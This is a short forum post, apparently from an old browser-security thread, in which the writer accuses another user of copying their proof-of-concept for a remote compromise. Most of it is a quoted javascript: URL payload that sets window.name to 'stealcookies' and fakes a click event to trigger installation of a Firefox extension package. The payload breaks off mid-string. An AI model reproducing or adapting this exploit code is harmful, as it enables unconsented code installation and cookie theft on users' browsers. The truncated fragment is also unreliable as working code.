This is the copy of my PoC. The person responsible for the leak of my remote compromise is the starter of this thread. In fact, he copies some of the code directly from my PoC:

javascript:'<noscript>'+eval('if (window.name!=\'stealcookies\'){window.name=\'stealcookies\';}  else{ event={target:{href:\'http://ftp.mozilla.org/pub/mozilla.org/extensions/flashgot/flashgot-0.5.9.1-fx+mz+tb.xpi\'}};install(event,\'You are vulnerable!!!

That is the window name, object creater, even direct string copies from my site. This guy is incredible.
